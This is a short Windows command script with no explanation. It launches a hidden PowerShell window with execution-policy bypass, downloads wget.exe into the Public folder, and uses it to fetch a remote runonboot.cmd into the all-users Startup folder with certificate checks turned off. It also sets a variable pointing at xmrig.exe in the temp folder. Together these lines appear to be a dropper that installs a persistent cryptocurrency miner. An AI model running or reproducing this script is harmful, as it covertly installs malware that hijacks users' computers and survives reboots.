cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/wget/1.20.3/64/wget.exe',\"$env:PUBLIC\wget.exe\")
setx wget "C:\Users\Public\wget.exe"
setx startup "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
C:\Users\Public\wget.exe -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/runonboot.cmd --no-check-certificate -O "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runonboot.cmd"
setx xmrig "%TMP%\xmrig.exe"
cls
exit
